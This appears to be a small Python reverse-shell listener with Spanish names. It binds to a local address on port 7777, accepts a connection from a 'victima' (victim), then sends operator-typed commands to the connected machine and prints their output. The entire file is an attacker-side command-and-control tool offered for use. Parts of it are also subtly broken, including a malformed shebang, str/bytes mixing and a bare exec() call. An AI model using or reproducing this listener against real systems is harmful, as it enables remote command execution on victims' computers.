#!/usr/bin/env/ python
#__*__ coding: utf8 _*_

import socket

def main():
    server = socket.socket()
    server.bind(('192.168.56.1',7777))
    server.listen(1)

    while True:
        victima,direccion = server.accept()
        print('Conexion de: {}'.format(direccion))

        ver = victima.recv(1024)

        if ver == "1":
            while True:
                opcion = input("shell@shell: ")
                victima.send(opcion)
                resultado = victima.recv(2048)
                print(resultado)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exec()